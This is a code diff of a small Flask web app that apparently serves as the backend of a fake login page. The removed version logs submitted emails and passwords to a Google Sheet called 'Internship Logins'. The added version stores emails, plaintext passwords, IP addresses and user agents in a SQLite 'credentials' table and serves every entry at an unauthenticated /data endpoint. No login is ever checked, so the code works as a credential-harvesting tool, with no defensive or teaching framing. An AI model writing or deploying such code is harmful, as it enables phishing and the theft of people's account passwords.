@@ -1,46 +1,58 @@
-from flask import Flask, render_template, request, redirect
+from flask import Flask, render_template, request, redirect, url_for
+import sqlite3
 import os
-import json
-from datetime import datetime
-import gspread
-from oauth2client.service_account import ServiceAccountCredentials
 
 app = Flask(__name__)
 
-# Setup Google Sheets API using JSON from environment
-scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
-creds_json = os.environ.get("GOOGLE_CREDS_JSON")
+# Initialize DB
+def init_db():
+    conn = sqlite3.connect('credentials.db')
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS credentials (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    email TEXT NOT NULL,
+                    password TEXT NOT NULL,
+                    ip_address TEXT,
+                    user_agent TEXT,
+                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+                )''')
+    conn.commit()
+    conn.close()
 
-if not creds_json:
-    raise Exception("GOOGLE_CREDS_JSON environment variable is missing!")
-
-creds_dict = json.loads(creds_json)
-creds = ServiceAccountCredentials.from_json_keyfile_dict(creds_dict, scope)
-client = gspread.authorize(creds)
-
-# Open Google Sheet (first sheet in the doc)
-sheet = client.open("Internship Logins").sheet1
+init_db()
 
 @app.route('/')
-def index():
+def login_page():
     return render_template('login.html')
 
 @app.route('/login', methods=['POST'])
 def login():
     email = request.form.get('email')
     password = request.form.get('password')
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    ip_address = request.remote_addr
+    user_agent = request.headers.get('User-Agent')
 
-    # Log credentials to Google Sheet
-    sheet.append_row([email, password, timestamp])
+    conn = sqlite3.connect('credentials.db')
+    c = conn.cursor()
+    c.execute("INSERT INTO credentials (email, password, ip_address, user_agent) VALUES (?, ?, ?, ?)",
+              (email, password, ip_address, user_agent))
+    conn.commit()
+    conn.close()
 
-    return redirect('/dashboard')
+    return redirect(url_for('dashboard'))
 
 @app.route('/dashboard')
 def dashboard():
     return render_template('dashboard.html')
 
-# Entry point
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 8080))  # Railway uses this
-    app.run(host='0.0.0.0', port=port)
+@app.route('/data')
+def show_data():
+    conn = sqlite3.connect('credentials.db')
+    c = conn.cursor()
+    c.execute("SELECT * FROM credentials ORDER BY timestamp DESC")
+    data = c.fetchall()
+    conn.close()
+    return {'credentials': data}
+
+if __name__ == '__main__':
+    app.run(debug=True)
